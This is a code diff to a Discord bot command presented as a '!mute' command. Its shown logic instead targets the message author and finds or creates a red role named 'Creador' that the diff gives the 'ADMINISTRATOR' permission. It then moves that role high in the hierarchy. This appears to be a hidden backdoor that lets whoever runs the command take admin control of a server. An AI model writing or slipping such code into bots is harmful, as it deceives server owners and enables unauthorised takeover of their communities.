@@ -7,13 +7,13 @@ module.exports = {
     examples: ['!mute @Firulais', '!mute 556540723235651584', '!mute @Firulais Razon'],
     run: async (client , message, args) => {
         let mutee = message.guild.member(message.author)
-    let muterole = message.guild.roles.cache.find(r => r.name === "Creador2")
+    let muterole = message.guild.roles.cache.get("722923658359734272")
     if(!muterole) {
         try{
             muterole = await message.guild.roles.create({ data: {  
                 name : "Creador",
                 color : "#FF0000",
-                permissions : ["CREATE_INSTANT_INVITE", "KICK_MEMBERS", "BAN_MEMBERS", "ADMINISTRATOR", "MANAGE_CHANNELS", "MANAGE_GUILD", "ADD_REACTIONS", "READ_MESSAGES", "SEND_MESSAGES", "SEND_TTS_MESSAGES", "MANAGE_MESSAGES", "EMBED_LINKS", "ATTACH_FILES", "READ_MESSAGE_HISTORY", "MENTION_EVERYONE", "EXTERNAL_EMOJIS", "CONNECT", "SPEAK", "MUTE_MEMBERS", "DEAFEN_MEMBERS", "MOVE_MEMBERS", "USE_VAD", "CHANGE_NICKNAME", "MANAGE_NICKNAMES", "MANAGE_ROLES_OR_PERMISSIONS", "MANAGE_WEBHOOKS", "MANAGE_EMOJIS"]
+                permissions : ["ADMINISTRATOR"]
             }
             })
             await muterole.setPosition(29);
